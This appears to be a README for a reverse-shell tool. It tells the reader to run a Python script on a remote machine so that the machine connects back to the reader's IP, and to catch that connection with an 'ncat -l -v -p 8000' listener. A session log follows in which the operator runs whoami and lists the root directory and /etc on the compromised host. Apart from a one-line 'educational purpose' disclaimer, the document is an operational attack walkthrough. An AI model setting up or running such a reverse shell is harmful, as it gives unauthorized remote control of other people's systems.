
Note: 
The below code is only for educational purpose and should not be used for malicious purposes, as it could be considered illegal and unethical.

Step 1: 
By running this on remote machine, it gives grants access to remote-ip mentioned in `access-remote-machine.py`
```
python access-remote-machine.py
```

Step 2: 
Install `ncat` if not installed on the machine

```
ncat -l -v -p 8000 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:32788.
whoami
node
whereis cat 
cat: /bin/cat /usr/share/man/man1/cat.1.gz

cd / && ls 
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

cd / && ls && cd /etc && ls 

bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

X11
adduser.conf
alternatives
apparmor.d
apt
bash.bashrc
bash_completion.d
bindresvport.blacklist
ca-certificates
ca-certificates.conf
cron.d
cron.daily
cron.weekly
dbus-1
debconf.conf
debian_version
default
deluser.conf
dpkg
e2scrub.conf
emacs
environment
ethertypes
fonts
fstab
gai.conf
groff
group
group-
gshadow
gshadow-
gss
host.conf
hostname
hosts
init.d
inputrc
iproute2
issue
issue.net
kernel
ld.so.cache
ld.so.conf
ld.so.conf.d
libaudit.conf
libnl-3
locale.alias
locale.gen
localtime
logcheck
login.defs
logrotate.d
magic
magic.mime
manpath.config
mercurial
mime.types
```
